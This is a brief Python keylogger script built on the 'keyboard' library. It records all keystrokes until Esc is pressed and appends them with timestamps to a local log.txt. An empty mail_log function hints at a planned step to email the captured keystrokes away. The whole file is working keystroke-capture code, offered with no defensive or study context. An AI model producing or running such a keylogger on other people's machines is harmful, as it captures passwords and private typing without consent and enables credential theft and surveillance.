import keyboard as kb
import time

def mail_log():
    pass

def keylog():
    logger_obj = kb.record(until = 'Esc')
    log_f = open("log.txt",'a')

    log_f.write("\n\n-----------------------Keyboard Log----------------\n\n")

    for data in logger_obj:
        curr_time_since_epoch = time.time()
        curr_time = time.ctime(curr_time_since_epoch)
        log_f.write(str(curr_time) + " "+ str(data) + "\n")

keylog()
